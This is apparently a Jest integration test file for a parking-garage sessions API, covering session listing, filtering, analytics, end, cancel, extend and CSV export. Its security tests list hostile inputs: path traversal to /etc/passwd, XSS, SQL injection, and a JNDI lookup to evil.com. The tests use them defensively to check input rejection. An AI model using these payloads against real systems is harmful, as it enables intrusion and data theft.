/**
 * Sessions API Integration Tests
 * 
 * Comprehensive tests for parking session management endpoints including
 * CRUD operations, filtering, pagination, analytics, and export functionality.
 * Tests both success and failure scenarios with proper validation.
 */

const request = require('supertest');
const app = require('../../src/app');
const MemoryStore = require('../../src/storage/memoryStore');
const { TestDataBuilder, MockGarageAPI } = require('../helpers/testUtils');

describe('Sessions API Integration Tests', () => {
  let store;
  let mockAPI;

  beforeEach(() => {
    // Reset memory store and initialize test data
    store = MemoryStore.getInstance();
    store.spots.clear();
    store.vehicles.clear();
    store.spotsByFloorBay.clear();
    store.occupiedSpots.clear();
    
    mockAPI = new MockGarageAPI();
    mockAPI.reset();
    
    // Initialize test garage with sessions
    initializeTestSessionsData();
  });

  /**
   * Initialize test data with various parking sessions
   */
  function initializeTestSessionsData() {
    const now = new Date();
    const oneDayAgo = new Date(now - 24 * 60 * 60 * 1000);
    const oneWeekAgo = new Date(now - 7 * 24 * 60 * 60 * 1000);
    
    // Create active sessions
    mockAPI.state.checkInVehicle('ACTIVE001');
    mockAPI.state.checkInVehicle('ACTIVE002');
    mockAPI.state.checkInVehicle('ACTIVE003');
    
    // Create completed sessions by checking in and immediately checking out
    mockAPI.state.checkInVehicle('COMPLETED001');
    const completedSession1 = mockAPI.state.checkOutVehicle('COMPLETED001');
    
    mockAPI.state.checkInVehicle('COMPLETED002');
    const completedSession2 = mockAPI.state.checkOutVehicle('COMPLETED002');
    
    // Simulate older sessions for date range testing
    const oldSession = mockAPI.state.checkInVehicle('OLDVEHICLE');
    oldSession.checkInTime = oneWeekAgo.toISOString();
  }

  describe('GET /api/sessions - List Sessions', () => {
    test('should return all sessions with default pagination', async () => {
      const response = await request(app)
        .get('/api/sessions')
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          data: expect.any(Array),
          pagination: expect.objectContaining({
            total: expect.any(Number),
            limit: 50, // default limit
            offset: 0, // default offset
            page: 1,
            totalPages: expect.any(Number),
            hasNextPage: expect.any(Boolean),
            hasPreviousPage: false
          })
        }),
        timestamp: expect.any(String)
      });

      expect(response.body.data.data.length).toBeGreaterThan(0);
      
      // Verify session structure
      const session = response.body.data.data[0];
      expect(session).toEqual(expect.objectContaining({
        id: expect.any(String),
        licensePlate: expect.any(String),
        spotId: expect.any(String),
        checkInTime: expect.any(String),
        status: expect.stringMatching(/^(active|completed|cancelled)$/)
      }));
    });

    test('should filter sessions by status', async () => {
      const response = await request(app)
        .get('/api/sessions?status=active')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.data).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            status: 'active'
          })
        ])
      );

      // Ensure no completed sessions in active filter
      const completedSessions = response.body.data.data.filter(s => s.status === 'completed');
      expect(completedSessions).toHaveLength(0);
    });

    test('should filter sessions by date range', async () => {
      const response = await request(app)
        .get('/api/sessions?dateRange=today')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.data).toEqual(expect.any(Array));

      // All sessions should be from today
      const today = new Date().toDateString();
      response.body.data.data.forEach(session => {
        const sessionDate = new Date(session.checkInTime).toDateString();
        expect(sessionDate).toBe(today);
      });
    });

    test('should search sessions by license plate', async () => {
      const response = await request(app)
        .get('/api/sessions?search=ACTIVE001')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.data).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            licensePlate: 'ACTIVE001'
          })
        ])
      );
    });

    test('should handle pagination correctly', async () => {
      const response = await request(app)
        .get('/api/sessions?limit=2&offset=1')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.pagination).toEqual(expect.objectContaining({
        limit: 2,
        offset: 1,
        page: 2,
        hasPreviousPage: true
      }));
      expect(response.body.data.data.length).toBeLessThanOrEqual(2);
    });

    test('should sort sessions correctly', async () => {
      const responseDesc = await request(app)
        .get('/api/sessions?sort=createdAt&order=desc')
        .expect(200);

      const responseAsc = await request(app)
        .get('/api/sessions?sort=createdAt&order=asc')
        .expect(200);

      expect(responseDesc.body.success).toBe(true);
      expect(responseAsc.body.success).toBe(true);

      const descSessions = responseDesc.body.data.data;
      const ascSessions = responseAsc.body.data.data;

      if (descSessions.length > 1) {
        // Verify descending order
        for (let i = 0; i < descSessions.length - 1; i++) {
          const current = new Date(descSessions[i].checkInTime);
          const next = new Date(descSessions[i + 1].checkInTime);
          expect(current.getTime()).toBeGreaterThanOrEqual(next.getTime());
        }
      }

      if (ascSessions.length > 1) {
        // Verify ascending order
        for (let i = 0; i < ascSessions.length - 1; i++) {
          const current = new Date(ascSessions[i].checkInTime);
          const next = new Date(ascSessions[i + 1].checkInTime);
          expect(current.getTime()).toBeLessThanOrEqual(next.getTime());
        }
      }
    });

    test('should validate invalid status filter', async () => {
      const response = await request(app)
        .get('/api/sessions?status=invalid')
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Invalid status filter'),
        timestamp: expect.any(String)
      });
    });

    test('should validate invalid date range', async () => {
      const response = await request(app)
        .get('/api/sessions?dateRange=invalid')
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Invalid dateRange filter'),
        timestamp: expect.any(String)
      });
    });

    test('should validate invalid sort field', async () => {
      const response = await request(app)
        .get('/api/sessions?sort=invalidField')
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Invalid sort field'),
        timestamp: expect.any(String)
      });
    });

    test('should enforce pagination limits', async () => {
      const response = await request(app)
        .get('/api/sessions?limit=200') // Over limit
        .expect(200);

      expect(response.body.data.pagination.limit).toBe(100); // Should be capped at 100
    });
  });

  describe('GET /api/sessions/stats - Session Statistics', () => {
    test('should return session statistics for all periods', async () => {
      const response = await request(app)
        .get('/api/sessions/stats')
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          total: expect.any(Number),
          active: expect.any(Number),
          completed: expect.any(Number),
          cancelled: expect.any(Number),
          averageDuration: expect.any(Number),
          totalRevenue: expect.any(Number),
          period: 'all'
        }),
        timestamp: expect.any(String)
      });
    });

    test('should return statistics for specific period', async () => {
      const response = await request(app)
        .get('/api/sessions/stats?period=today')
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.period).toBe('today');
      expect(response.body.data.total).toBeGreaterThanOrEqual(0);
    });

    test('should validate invalid period parameter', async () => {
      const response = await request(app)
        .get('/api/sessions/stats?period=invalid')
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Invalid period'),
        timestamp: expect.any(String)
      });
    });
  });

  describe('GET /api/sessions/analytics - Session Analytics', () => {
    test('should return revenue analytics', async () => {
      const response = await request(app)
        .get('/api/sessions/analytics?type=revenue')
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          type: 'revenue',
          totalRevenue: expect.any(Number),
          averageRevenue: expect.any(Number),
          revenueByPeriod: expect.any(Object)
        }),
        timestamp: expect.any(String)
      });
    });

    test('should return duration analytics', async () => {
      const response = await request(app)
        .get('/api/sessions/analytics?type=duration')
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          type: 'duration',
          averageDuration: expect.any(Number),
          medianDuration: expect.any(Number),
          durationDistribution: expect.any(Object)
        }),
        timestamp: expect.any(String)
      });
    });

    test('should return peak hours analytics', async () => {
      const response = await request(app)
        .get('/api/sessions/analytics?type=peak')
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          type: 'peak',
          peakHours: expect.any(Array),
          hourlyDistribution: expect.any(Object)
        }),
        timestamp: expect.any(String)
      });
    });

    test('should validate invalid analytics type', async () => {
      const response = await request(app)
        .get('/api/sessions/analytics?type=invalid')
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Invalid analytics type'),
        timestamp: expect.any(String)
      });
    });
  });

  describe('GET /api/sessions/:id - Get Session by ID', () => {
    test('should return specific session details', async () => {
      // First, get a session ID
      const sessionsResponse = await request(app)
        .get('/api/sessions')
        .expect(200);

      const sessionId = sessionsResponse.body.data.data[0].id;

      const response = await request(app)
        .get(`/api/sessions/${sessionId}`)
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          id: sessionId,
          licensePlate: expect.any(String),
          spotId: expect.any(String),
          checkInTime: expect.any(String),
          status: expect.stringMatching(/^(active|completed|cancelled)$/)
        }),
        timestamp: expect.any(String)
      });
    });

    test('should return 404 for non-existent session', async () => {
      const response = await request(app)
        .get('/api/sessions/NONEXISTENT')
        .expect(404);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Session not found'),
        timestamp: expect.any(String)
      });
    });

    test('should validate session ID format', async () => {
      const response = await request(app)
        .get('/api/sessions/invalid-id-format')
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Invalid session ID format'),
        timestamp: expect.any(String)
      });
    });
  });

  describe('POST /api/sessions/:id/end - End Session', () => {
    test('should successfully end an active session', async () => {
      // Create an active session first
      const vehicle = mockAPI.state.checkInVehicle('ENDTEST001');
      const sessionId = vehicle.ticketId;

      const response = await request(app)
        .post(`/api/sessions/${sessionId}/end`)
        .send({ reason: 'Normal checkout' })
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          id: sessionId,
          status: 'completed',
          endTime: expect.any(String),
          duration: expect.any(Number),
          cost: expect.any(Number)
        }),
        message: 'Session ended successfully',
        timestamp: expect.any(String)
      });
    });

    test('should reject ending non-existent session', async () => {
      const response = await request(app)
        .post('/api/sessions/NONEXISTENT/end')
        .send({ reason: 'Test' })
        .expect(404);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Session not found'),
        timestamp: expect.any(String)
      });
    });

    test('should reject ending already completed session', async () => {
      // Create and immediately complete a session
      const vehicle = mockAPI.state.checkInVehicle('ENDTEST002');
      const sessionId = vehicle.ticketId;
      mockAPI.state.checkOutVehicle('ENDTEST002');

      const response = await request(app)
        .post(`/api/sessions/${sessionId}/end`)
        .send({ reason: 'Test' })
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Session already completed'),
        timestamp: expect.any(String)
      });
    });

    test('should handle missing request body gracefully', async () => {
      const vehicle = mockAPI.state.checkInVehicle('ENDTEST003');
      const sessionId = vehicle.ticketId;

      const response = await request(app)
        .post(`/api/sessions/${sessionId}/end`)
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.status).toBe('completed');
    });
  });

  describe('POST /api/sessions/:id/cancel - Cancel Session', () => {
    test('should successfully cancel an active session', async () => {
      const vehicle = mockAPI.state.checkInVehicle('CANCELTEST001');
      const sessionId = vehicle.ticketId;

      const response = await request(app)
        .post(`/api/sessions/${sessionId}/cancel`)
        .send({ reason: 'Emergency cancellation' })
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          id: sessionId,
          status: 'cancelled',
          cancelTime: expect.any(String),
          cancelReason: 'Emergency cancellation'
        }),
        message: 'Session cancelled successfully',
        timestamp: expect.any(String)
      });
    });

    test('should reject cancelling completed session', async () => {
      const vehicle = mockAPI.state.checkInVehicle('CANCELTEST002');
      const sessionId = vehicle.ticketId;
      mockAPI.state.checkOutVehicle('CANCELTEST002');

      const response = await request(app)
        .post(`/api/sessions/${sessionId}/cancel`)
        .send({ reason: 'Test' })
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Cannot cancel completed session'),
        timestamp: expect.any(String)
      });
    });

    test('should require cancellation reason for policy compliance', async () => {
      const vehicle = mockAPI.state.checkInVehicle('CANCELTEST003');
      const sessionId = vehicle.ticketId;

      const response = await request(app)
        .post(`/api/sessions/${sessionId}/cancel`)
        .send({})
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Cancellation reason is required'),
        timestamp: expect.any(String)
      });
    });
  });

  describe('POST /api/sessions/:id/extend - Extend Session', () => {
    test('should successfully extend an active session', async () => {
      const vehicle = mockAPI.state.checkInVehicle('EXTENDTEST001');
      const sessionId = vehicle.ticketId;

      const response = await request(app)
        .post(`/api/sessions/${sessionId}/extend`)
        .send({ additionalHours: 2 })
        .expect(200);

      expect(response.body).toEqual({
        success: true,
        data: expect.objectContaining({
          id: sessionId,
          status: 'active',
          originalEndTime: expect.any(String),
          newEndTime: expect.any(String),
          additionalHours: 2,
          additionalCost: expect.any(Number)
        }),
        message: 'Session extended successfully',
        timestamp: expect.any(String)
      });

      // Verify the extension was applied
      const originalEnd = new Date(response.body.data.originalEndTime);
      const newEnd = new Date(response.body.data.newEndTime);
      const timeDiff = newEnd - originalEnd;
      expect(timeDiff).toBe(2 * 60 * 60 * 1000); // 2 hours in milliseconds
    });

    test('should validate additionalHours parameter', async () => {
      const vehicle = mockAPI.state.checkInVehicle('EXTENDTEST002');
      const sessionId = vehicle.ticketId;

      const response = await request(app)
        .post(`/api/sessions/${sessionId}/extend`)
        .send({ additionalHours: 'invalid' })
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('additionalHours must be a positive number'),
        timestamp: expect.any(String)
      });
    });

    test('should reject extending completed session', async () => {
      const vehicle = mockAPI.state.checkInVehicle('EXTENDTEST003');
      const sessionId = vehicle.ticketId;
      mockAPI.state.checkOutVehicle('EXTENDTEST003');

      const response = await request(app)
        .post(`/api/sessions/${sessionId}/extend`)
        .send({ additionalHours: 1 })
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Cannot extend completed session'),
        timestamp: expect.any(String)
      });
    });

    test('should enforce maximum extension limits', async () => {
      const vehicle = mockAPI.state.checkInVehicle('EXTENDTEST004');
      const sessionId = vehicle.ticketId;

      const response = await request(app)
        .post(`/api/sessions/${sessionId}/extend`)
        .send({ additionalHours: 25 }) // Over 24-hour limit
        .expect(400);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Maximum extension is 24 hours'),
        timestamp: expect.any(String)
      });
    });
  });

  describe('GET /api/sessions/export/csv - CSV Export', () => {
    test('should export sessions as CSV', async () => {
      const response = await request(app)
        .get('/api/sessions/export/csv')
        .expect(200);

      expect(response.headers['content-type']).toBe('text/csv; charset=utf-8');
      expect(response.headers['content-disposition']).toMatch(/attachment; filename="sessions-export-\d{4}-\d{2}-\d{2}\.csv"/);
      expect(response.text).toMatch(/licensePlate,spotId,checkInTime,status/); // CSV headers
    });

    test('should export filtered sessions as CSV', async () => {
      const response = await request(app)
        .get('/api/sessions/export/csv?status=active')
        .expect(200);

      expect(response.headers['content-type']).toBe('text/csv; charset=utf-8');
      expect(response.text).toContain('licensePlate,spotId,checkInTime,status');
    });

    test('should handle empty results in CSV export', async () => {
      const response = await request(app)
        .get('/api/sessions/export/csv?search=NONEXISTENTPLATE')
        .expect(200);

      expect(response.headers['content-type']).toBe('text/csv; charset=utf-8');
      expect(response.text.trim()).toBe('licensePlate,spotId,checkInTime,status'); // Only headers
    });
  });

  describe('Authorization and Security', () => {
    test('should handle malformed session IDs safely', async () => {
      const maliciousIds = [
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        'OR 1=1--',
        '${jndi:ldap://evil.com}',
        '%00%2e%2e%2f',
        'null'
      ];

      for (const maliciousId of maliciousIds) {
        const response = await request(app)
          .get(`/api/sessions/${encodeURIComponent(maliciousId)}`)
          .expect(400);

        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Invalid session ID format');
      }
    });

    test('should sanitize search inputs', async () => {
      const maliciousSearches = [
        '<script>alert("xss")</script>',
        'OR 1=1--',
        '${jndi:ldap://evil.com}',
        '../../../etc/passwd'
      ];

      for (const search of maliciousSearches) {
        const response = await request(app)
          .get(`/api/sessions?search=${encodeURIComponent(search)}`);

        expect(response.status).toBeLessThan(500); // Should not crash
        expect(response.body.success).toBeDefined();
      }
    });

    test('should rate limit session operations', async () => {
      // This test would need actual rate limiting implementation
      // For now, just verify the endpoint responds
      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(request(app).get('/api/sessions'));
      }

      const responses = await Promise.all(promises);
      responses.forEach(response => {
        expect(response.status).toBeLessThan(500);
      });
    });
  });

  describe('Edge Cases and Error Handling', () => {
    test('should handle concurrent session modifications', async () => {
      const vehicle = mockAPI.state.checkInVehicle('CONCURRENT001');
      const sessionId = vehicle.ticketId;

      // Attempt concurrent end and extend operations
      const endPromise = request(app)
        .post(`/api/sessions/${sessionId}/end`)
        .send({ reason: 'Concurrent test' });

      const extendPromise = request(app)
        .post(`/api/sessions/${sessionId}/extend`)
        .send({ additionalHours: 1 });

      const [endResponse, extendResponse] = await Promise.all([endPromise, extendPromise]);

      // One should succeed, one should fail
      const successCount = [endResponse, extendResponse].filter(r => r.status === 200).length;
      const errorCount = [endResponse, extendResponse].filter(r => r.status >= 400).length;

      expect(successCount).toBe(1);
      expect(errorCount).toBe(1);
    });

    test('should handle database errors gracefully', async () => {
      // Simulate database error by corrupting the store
      const originalSpots = store.spots;
      store.spots = null;

      const response = await request(app)
        .get('/api/sessions')
        .expect(500);

      expect(response.body).toEqual({
        success: false,
        message: expect.stringContaining('Internal server error'),
        timestamp: expect.any(String)
      });

      // Restore for cleanup
      store.spots = originalSpots;
    });

    test('should validate large pagination requests', async () => {
      const response = await request(app)
        .get('/api/sessions?limit=1000000&offset=999999')
        .expect(200);

      expect(response.body.data.pagination.limit).toBeLessThanOrEqual(100);
      expect(response.body.data.pagination.offset).toBeLessThan(1000000);
    });

    test('should handle malformed JSON in request bodies', async () => {
      const vehicle = mockAPI.state.checkInVehicle('MALFORM001');
      const sessionId = vehicle.ticketId;

      const response = await request(app)
        .post(`/api/sessions/${sessionId}/end`)
        .set('Content-Type', 'application/json')
        .send('{"malformed": json}') // Invalid JSON
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.message).toContain('Invalid JSON');
    });
  });
});